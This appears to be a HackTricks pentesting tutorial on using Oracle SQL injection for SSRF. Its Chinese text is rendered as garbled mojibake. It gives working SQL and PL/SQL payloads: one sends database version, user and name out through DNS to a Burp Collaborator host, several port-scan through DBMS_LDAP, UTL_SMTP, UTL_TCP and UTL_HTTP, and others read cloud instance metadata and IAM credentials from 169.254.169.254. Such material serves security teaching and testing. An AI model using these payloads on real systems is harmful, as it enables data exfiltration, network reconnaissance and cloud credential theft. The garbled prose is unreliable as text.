# Oracleæ³¨å…¥

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricksäº‘ â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ æ¨ç‰¹ ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ YouTube ğŸ¥</strong></a></summary>

* ä½ åœ¨ä¸€å®¶**ç½‘ç»œå®‰å…¨å…¬å¸**å·¥ä½œå—ï¼Ÿä½ æƒ³åœ¨HackTricksä¸­çœ‹åˆ°ä½ çš„**å…¬å¸å¹¿å‘Š**å—ï¼Ÿæˆ–è€…ä½ æƒ³è·å¾—**PEASSçš„æœ€æ–°ç‰ˆæœ¬æˆ–ä¸‹è½½PDFæ ¼å¼çš„HackTricks**å—ï¼Ÿè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* å‘ç°æˆ‘ä»¬çš„ç‹¬å®¶[**NFTs**](https://opensea.io/collection/the-peass-family)æ”¶è—å“[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* è·å–[**å®˜æ–¹PEASSå’ŒHackTrickså‘¨è¾¹äº§å“**](https://peass.creator-spring.com)
* **åŠ å…¥**[**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f)æˆ–[**ç”µæŠ¥ç¾¤ç»„**](https://t.me/peass)ï¼Œæˆ–**å…³æ³¨**æˆ‘åœ¨**Twitter**ä¸Šçš„[**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**ã€‚**
* **é€šè¿‡å‘**[**hacktricks repo**](https://github.com/carlospolop/hacktricks) **å’Œ**[**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **æäº¤PRæ¥åˆ†äº«ä½ çš„é»‘å®¢æŠ€å·§ã€‚**

</details>

## SSRF

ä½¿ç”¨Oracleè¿›è¡Œå¸¦å¤–HTTPå’ŒDNSè¯·æ±‚çš„æ–¹æ³•å·²ç»æœ‰å¾ˆå¤šæ–‡æ¡£ï¼Œä½†ä½œä¸ºæ³¨å…¥ä¸­æ³„éœ²SQLæ•°æ®çš„æ‰‹æ®µã€‚æˆ‘ä»¬æ€»æ˜¯å¯ä»¥ä¿®æ”¹è¿™äº›æŠ€æœ¯/å‡½æ•°æ¥è¿›è¡Œå…¶ä»–SSRF/XSPAã€‚

å®‰è£…Oracleå¯èƒ½éå¸¸ç—›è‹¦ï¼Œç‰¹åˆ«æ˜¯å¦‚æœä½ æƒ³å¿«é€Ÿè®¾ç½®ä¸€ä¸ªå®ä¾‹æ¥å°è¯•å‘½ä»¤ã€‚æˆ‘çš„æœ‹å‹å’Œ[Appsecco](https://appsecco.com)çš„åŒäº‹[Abhisek Datta](https://github.com/abhisek)å‘æˆ‘æŒ‡å‡ºäº†[https://github.com/MaksymBilenko/docker-oracle-12c](https://github.com/MaksymBilenko/docker-oracle-12c)ï¼Œå®ƒå…è®¸æˆ‘åœ¨t2.large AWS Ubuntuæœºå™¨å’ŒDockerä¸Šè®¾ç½®ä¸€ä¸ªå®ä¾‹ã€‚

æˆ‘ä½¿ç”¨`--network="host"`æ ‡å¿—è¿è¡Œäº†dockerå‘½ä»¤ï¼Œè¿™æ ·æˆ‘å°±å¯ä»¥æ¨¡æ‹ŸOracleä½œä¸ºæœ¬åœ°å®‰è£…ï¼Œå¹¶å…·æœ‰å®Œå…¨çš„ç½‘ç»œè®¿é—®æƒé™ï¼Œç”¨äºæœ¬ç¯‡åšæ–‡çš„è¿‡ç¨‹ä¸­ã€‚
```
docker run -d --network="host" quay.io/maksymbilenko/oracle-12c
```
#### æ”¯æŒURLæˆ–ä¸»æœºå/ç«¯å£å·è§„èŒƒçš„OracleåŒ… <a href="#oracle-packages-that-support-a-url-or-a-hostname-port-number-specification" id="oracle-packages-that-support-a-url-or-a-hostname-port-number-specification"></a>

ä¸ºäº†æ‰¾åˆ°æ”¯æŒä¸»æœºå’Œç«¯å£è§„èŒƒçš„ä»»ä½•åŒ…å’Œå‡½æ•°ï¼Œæˆ‘åœ¨[Oracleæ•°æ®åº“åœ¨çº¿æ–‡æ¡£](https://docs.oracle.com/database/121/index.html)ä¸Šè¿›è¡Œäº†è°·æ­Œæœç´¢ã€‚å…·ä½“æ¥è¯´ï¼Œ
```
site:docs.oracle.com inurl:"/database/121/ARPLS" "host"|"hostname" "port"|"portnum"
```
æœç´¢è¿”å›äº†ä»¥ä¸‹ç»“æœï¼ˆå¹¶éæ‰€æœ‰ç»“æœéƒ½å¯ç”¨äºæ‰§è¡Œå‡ºç«™ç½‘ç»œæ“ä½œï¼‰

* DBMS\_NETWORK\_ACL\_ADMIN
* UTL\_SMTP
* DBMS\_XDB
* DBMS\_SCHEDULER
* DBMS\_XDB\_CONFIG
* DBMS\_AQ
* UTL\_MAIL
* DBMS\_AQELM
* DBMS\_NETWORK\_ACL\_UTILITY
* DBMS\_MGD\_ID\_UTL
* UTL\_TCP
* DBMS\_MGWADM
* DBMS\_STREAMS\_ADM
* UTL\_HTTP

è¿™ä¸ªç®€å•çš„æœç´¢æ˜¾ç„¶è·³è¿‡äº†åƒ`DBMS_LDAP`ï¼ˆå…è®¸ä¼ é€’ä¸»æœºåå’Œç«¯å£å·ï¼‰è¿™æ ·çš„åŒ…ï¼Œå› ä¸º[æ–‡æ¡£é¡µé¢](https://docs.oracle.com/database/121/ARPLS/d\_ldap.htm#ARPLS360)åªæ˜¯å°†æ‚¨æŒ‡å‘[ä¸åŒçš„ä½ç½®](https://docs.oracle.com/database/121/ARPLS/d\_ldap.htm#ARPLS360)ã€‚å› æ­¤ï¼Œå¯èƒ½è¿˜æœ‰å…¶ä»–å¯ä»¥æ»¥ç”¨çš„OracleåŒ…ï¼Œç”¨äºè¿›è¡Œå‡ºç«™è¯·æ±‚ï¼Œæˆ‘å¯èƒ½å¿½ç•¥äº†ã€‚

æ— è®ºå¦‚ä½•ï¼Œè®©æˆ‘ä»¬æ¥çœ‹çœ‹æˆ‘ä»¬å‘ç°å¹¶åˆ—å‡ºçš„ä¸€äº›åŒ…ã€‚

**DBMS\_LDAP.INIT**

`DBMS_LDAP`åŒ…å…è®¸è®¿é—®LDAPæœåŠ¡å™¨ä¸Šçš„æ•°æ®ã€‚`init()`å‡½æ•°ç”¨äºåˆå§‹åŒ–ä¸LDAPæœåŠ¡å™¨çš„ä¼šè¯ï¼Œå¹¶ä»¥ä¸»æœºåå’Œç«¯å£å·ä½œä¸ºå‚æ•°ã€‚

æ­¤å‡½æ•°ä»¥å‰å·²ç»è®°å½•è¿‡ï¼Œç”¨äºæ˜¾ç¤ºé€šè¿‡DNSæ³„éœ²æ•°æ®ï¼Œå¦‚ä¸‹æ‰€ç¤º
```
SELECT DBMS_LDAP.INIT((SELECT version FROM v$instance)||'.'||(SELECT user FROM dual)||'.'||(select name from V$database)||'.'||'d4iqio0n80d5j4yg7mpu6oeif9l09p.burpcollaborator.net',80) FROM dual;
```
ç„¶è€Œï¼Œé‰´äºè¯¥å‡½æ•°æ¥å—ä¸»æœºåå’Œç«¯å£å·ä½œä¸ºå‚æ•°ï¼Œæ‚¨ä¹Ÿå¯ä»¥å°†å…¶ç”¨ä½œç«¯å£æ‰«æå™¨ã€‚

ä»¥ä¸‹æ˜¯ä¸€äº›ç¤ºä¾‹ï¼š
```
SELECT DBMS_LDAP.INIT('scanme.nmap.org',22) FROM dual;
SELECT DBMS_LDAP.INIT('scanme.nmap.org',25) FROM dual;
SELECT DBMS_LDAP.INIT('scanme.nmap.org',80) FROM dual;
SELECT DBMS_LDAP.INIT('scanme.nmap.org',8080) FROM dual;
```
![](https://ibreak.software/img/using-sql-injection-to-perform-ssrf-xspa-attacks/18.png)

ä¸€ä¸ª `ORA-31203: DBMS_LDAP: PL/SQL - åˆå§‹åŒ–å¤±è´¥` è¡¨æ˜ç«¯å£å…³é—­ï¼Œè€Œä¼šè¯å€¼æŒ‡å‘ç«¯å£å¼€æ”¾ã€‚

**UTL\_SMTP**

`UTL_SMTP` åŒ…æ˜¯ç”¨äºé€šè¿‡ SMTP å‘é€ç”µå­é‚®ä»¶çš„ã€‚åœ¨ [Oracle æ–‡æ¡£ç½‘ç«™ä¸Šæä¾›çš„ç¤ºä¾‹å±•ç¤ºäº†å¦‚ä½•ä½¿ç”¨è¯¥åŒ…å‘é€ç”µå­é‚®ä»¶](https://docs.oracle.com/database/121/ARPLS/u\_smtp.htm#ARPLS71478)ã€‚ç„¶è€Œï¼Œå¯¹æˆ‘ä»¬æ¥è¯´ï¼Œæœ‰è¶£çš„æ˜¯èƒ½å¤Ÿæä¾›ä¸»æœºå’Œç«¯å£è§„èŒƒçš„èƒ½åŠ›ã€‚

ä¸‹é¢æ˜¯ä¸€ä¸ªç®€å•çš„ç¤ºä¾‹ï¼Œä½¿ç”¨ `UTL_SMTP.OPEN_CONNECTION` å‡½æ•°ï¼Œè¶…æ—¶è®¾ç½®ä¸º 2 ç§’ã€‚
```
DECLARE c utl_smtp.connection;
BEGIN
c := UTL_SMTP.OPEN_CONNECTION('scanme.nmap.org',80,2);
END;
```

```
DECLARE c utl_smtp.connection;
BEGIN
c := UTL_SMTP.OPEN_CONNECTION('scanme.nmap.org',8080,2);
END;
```
![](https://ibreak.software/img/using-sql-injection-to-perform-ssrf-xspa-attacks/19.png)

ä¸€ä¸ª `ORA-29276: transfer timeout` é”™è¯¯è¡¨ç¤ºç«¯å£æ˜¯æ‰“å¼€çš„ï¼Œä½†æ²¡æœ‰å»ºç«‹ SMTP è¿æ¥ï¼Œè€Œ `ORA-29278: SMTP transient error: 421 Service not available` é”™è¯¯è¡¨ç¤ºç«¯å£æ˜¯å…³é—­çš„ã€‚

**UTL\_TCP**

`UTL_TCP` åŒ…åŠå…¶è¿‡ç¨‹å’Œå‡½æ•°å…è®¸ä¸åŸºäº TCP/IP çš„æœåŠ¡è¿›è¡Œé€šä¿¡ã€‚å¦‚æœä¸ºç‰¹å®šæœåŠ¡ç¼–ç¨‹ï¼Œè¯¥åŒ…å¯ä»¥è½»æ¾æˆä¸ºè¿›å…¥ç½‘ç»œæˆ–æ‰§è¡Œå®Œæ•´çš„æœåŠ¡å™¨ç«¯è¯·æ±‚çš„é€”å¾„ï¼Œå› ä¸ºå¯ä»¥æ§åˆ¶ TCP/IP è¿æ¥çš„æ‰€æœ‰æ–¹é¢ã€‚

åœ¨ Oracle æ–‡æ¡£ç½‘ç«™ä¸Šçš„ç¤ºä¾‹æ˜¾ç¤ºäº†å¦‚ä½•ä½¿ç”¨æ­¤åŒ…å»ºç«‹åŸå§‹çš„ TCP è¿æ¥ä»¥è·å–ç½‘é¡µã€‚æˆ‘ä»¬å¯ä»¥ç®€åŒ–å®ƒï¼Œå¹¶ä½¿ç”¨å®ƒæ¥å¯¹å…ƒæ•°æ®å®ä¾‹æˆ–ä»»æ„ TCP/IP æœåŠ¡è¿›è¡Œè¯·æ±‚ã€‚
```
set serveroutput on size 30000;
SET SERVEROUTPUT ON
DECLARE c utl_tcp.connection;
retval pls_integer;
BEGIN
c := utl_tcp.open_connection('169.254.169.254',80,tx_timeout => 2);
retval := utl_tcp.write_line(c, 'GET /latest/meta-data/ HTTP/1.0');
retval := utl_tcp.write_line(c);
BEGIN
LOOP
dbms_output.put_line(utl_tcp.get_line(c, TRUE));
END LOOP;
EXCEPTION
WHEN utl_tcp.end_of_input THEN
NULL;
END;
utl_tcp.close_connection(c);
END;
/
```
![](https://ibreak.software/img/using-sql-injection-to-perform-ssrf-xspa-attacks/20.png)
```
DECLARE c utl_tcp.connection;
retval pls_integer;
BEGIN
c := utl_tcp.open_connection('scanme.nmap.org',22,tx_timeout => 4);
retval := utl_tcp.write_line(c);
BEGIN
LOOP
dbms_output.put_line(utl_tcp.get_line(c, TRUE));
END LOOP;
EXCEPTION
WHEN utl_tcp.end_of_input THEN
NULL;
END;
utl_tcp.close_connection(c);
END;
```
![](https://ibreak.software/img/using-sql-injection-to-perform-ssrf-xspa-attacks/21.png)

æœ‰è¶£çš„æ˜¯ï¼Œç”±äºèƒ½å¤Ÿæ„é€ åŸå§‹çš„TCPè¯·æ±‚ï¼Œè¿™ä¸ªåŒ…ä¹Ÿå¯ä»¥ç”¨äºæŸ¥è¯¢æ‰€æœ‰äº‘æä¾›å•†çš„å®ä¾‹å…ƒæ•°æ®æœåŠ¡ï¼Œå› ä¸ºæ–¹æ³•ç±»å‹å’Œé™„åŠ çš„å¤´ä¿¡æ¯éƒ½å¯ä»¥åœ¨TCPè¯·æ±‚ä¸­ä¼ é€’ã€‚

**UTL\_HTTPå’ŒWebè¯·æ±‚**

ä¹Ÿè®¸åœ¨æ¯ä¸ªå…³äºOracle SQLæ³¨å…¥çš„æ•™ç¨‹ä¸­æœ€å¸¸è§å’Œå¹¿æ³›è®°å½•çš„æŠ€æœ¯æ˜¯[`UTL_HTTP`åŒ…](https://docs.oracle.com/database/121/ARPLS/u\_http.htm#ARPLS070)ã€‚æ ¹æ®æ–‡æ¡£çš„å®šä¹‰ï¼Œè¯¥åŒ…æ˜¯ - `UTL_HTTPåŒ…ä»SQLå’ŒPL/SQLä¸­è¿›è¡Œè¶…æ–‡æœ¬ä¼ è¾“åè®®ï¼ˆHTTPï¼‰è°ƒç”¨ã€‚æ‚¨å¯ä»¥ä½¿ç”¨å®ƒé€šè¿‡HTTPè®¿é—®äº’è”ç½‘ä¸Šçš„æ•°æ®ã€‚`
```
select UTL_HTTP.request('http://169.254.169.254/latest/meta-data/iam/security-credentials/adminrole') from dual;
```
![](https://ibreak.software/img/using-sql-injection-to-perform-ssrf-xspa-attacks/16.png)

æ­¤å¤–ï¼Œæ‚¨è¿˜å¯ä»¥ä½¿ç”¨ä»¥ä¸‹æŸ¥è¯¢æ‰§è¡Œä¸€äº›åŸºæœ¬çš„ç«¯å£æ‰«æï¼š
```
select UTL_HTTP.request('http://scanme.nmap.org:22') from dual;
select UTL_HTTP.request('http://scanme.nmap.org:8080') from dual;
select UTL_HTTP.request('http://scanme.nmap.org:25') from dual;
```
![](https://ibreak.software/img/using-sql-injection-to-perform-ssrf-xspa-attacks/17.png)

ä¸€ä¸ª `ORA-12541: TNS:no listener` æˆ–è€… `TNS:operation timed out` çš„é”™è¯¯è¡¨ç¤º TCP ç«¯å£å…³é—­ï¼Œè€Œ `ORA-29263: HTTP protocol error` æˆ–è€…æ•°æ®è¡¨ç¤ºç«¯å£æ‰“å¼€ã€‚

æˆ‘è¿‡å»ä½¿ç”¨è¿‡çš„å¦ä¸€ä¸ªåŒ…æ˜¯ [`HTTPURITYPE` Oracle æŠ½è±¡ç±»å‹çš„ `GETCLOB()` æ–¹æ³•](https://docs.oracle.com/database/121/ARPLS/t\_dburi.htm#ARPLS71705)ï¼Œå®ƒå…è®¸æ‚¨ä¸ URL è¿›è¡Œäº¤äº’ï¼Œå¹¶æä¾›å¯¹ HTTP åè®®çš„æ”¯æŒã€‚`GETCLOB()` æ–¹æ³•ç”¨äºå°† URL çš„ GET å“åº”ä½œä¸º [CLOB æ•°æ®ç±»å‹](https://docs.oracle.com/javadb/10.10.1.2/ref/rrefclob.html) è·å–ã€‚[select HTTPURITYPE('http://169.254.169.254/latest/meta-data/instance-id').getclob() from dual;![](https://ibreak.software/img/using-sql-injection-to-perform-ssrf-xspa-attacks/22.png)](https://docs.oracle.com/javadb/10.10.1.2/ref/rrefclob.html)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks äº‘ â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

* ä½ åœ¨ä¸€å®¶ **ç½‘ç»œå®‰å…¨å…¬å¸** å·¥ä½œå—ï¼Ÿä½ æƒ³åœ¨ HackTricks ä¸­çœ‹åˆ°ä½ çš„ **å…¬å¸å¹¿å‘Š** å—ï¼Ÿæˆ–è€…ä½ æƒ³è·å¾— **PEASS çš„æœ€æ–°ç‰ˆæœ¬æˆ–ä¸‹è½½ HackTricks çš„ PDF** å—ï¼Ÿè¯·æŸ¥çœ‹ [**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* å‘ç°æˆ‘ä»¬çš„ç‹¬å®¶ [**NFTs**](https://opensea.io/collection/the-peass-family) é›†åˆ [**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* è·å– [**å®˜æ–¹ PEASS & HackTricks å•†å“**](https://peass.creator-spring.com)
* **åŠ å…¥** [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ–è€… [**Telegram ç¾¤ç»„**](https://t.me/peass) æˆ–è€… **å…³æ³¨** æˆ‘çš„ **Twitter** [**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **é€šè¿‡å‘** [**hacktricks ä»“åº“**](https://github.com/carlospolop/hacktricks) **å’Œ** [**hacktricks-cloud ä»“åº“**](https://github.com/carlospolop/hacktricks-cloud) **æäº¤ PR æ¥åˆ†äº«ä½ çš„é»‘å®¢æŠ€å·§ã€‚**

</details>
